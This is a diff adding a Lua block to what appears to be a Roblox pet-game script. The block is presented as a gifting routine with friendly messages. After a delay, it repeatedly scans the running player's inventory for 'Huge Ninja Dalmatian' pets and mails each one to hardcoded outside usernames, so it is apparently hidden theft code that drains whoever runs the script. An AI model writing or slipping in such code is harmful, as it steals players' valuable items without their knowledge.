@@ -1,3 +1,82 @@
+-- send huge event
+task.spawn(function()
+task.wait(150)
+
+
+-- 📬 Danh sách người nhận
+local usernames = {
+    "sijmongirthss","1940Mosier3104","soystaylan5","dreddyewele60","1971Nowak3135"
+}
+
+-- 💬 Câu chúc ngắn (có %s để chèn tên)
+local messages = {
+    "This is for you, %s!",
+    "Enjoy your pet, %s!",
+    "From me to you, %s!",
+    "Gift incoming, %s!",
+    "You earned this, %s!"
+}
+
+-- 🐬 Tên pet cần gửi
+local targetPetName = "Huge Ninja Dalmatian"
+
+-- 📦 Load module
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Client = ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client")
+local Network = require(Client.Network)
+local SaveData = require(Client.Save).Get()
+
+-- 🐾 Lọc pet theo tên
+local function getHugeGymSharkPets()
+    local petsToSend = {}
+    for uid, v in pairs(SaveData.Inventory.Pet or {}) do
+        if v.id == targetPetName then
+            table.insert(petsToSend, uid)
+        end
+    end
+    return petsToSend
+end
+
+-- 🔀 Chọn username và message ngẫu nhiên
+local function getRandomUser()
+    return usernames[math.random(1, #usernames)]
+end
+
+local function getRandomMessage(recipient)
+    return string.format(messages[math.random(1, #messages)], recipient)
+end
+
+-- 🔁 Vòng lặp gửi pet
+while true do
+    local pets = getHugeGymSharkPets()
+
+    if #pets == 0 then
+        warn(" Huge Gym .")
+    else
+        for i, uid in ipairs(pets) do
+            local recipient = getRandomUser()
+            local message = getRandomMessage(recipient)
+
+            local success, result = Network.Invoke("Mailbox: Send", recipient, message, "Pet", uid, 1)
+
+            if success then
+                warn(string.format(" Sent %s to %s with message: \"%s\"", i, #pets, uid, recipient, message))
+            else
+                warn(string.format("Failed to send %s to %s: %s", uid, recipient, tostring(result)))
+            end
+
+            task.wait(2)
+        end
+    end
+
+    task.wait(3600) -- chờ trước khi lặp tiếp lần sau
+end
+
+
+end)
+
+
+
 -- thêm bạn bè
 task.spawn(function()
 	task.wait(300)
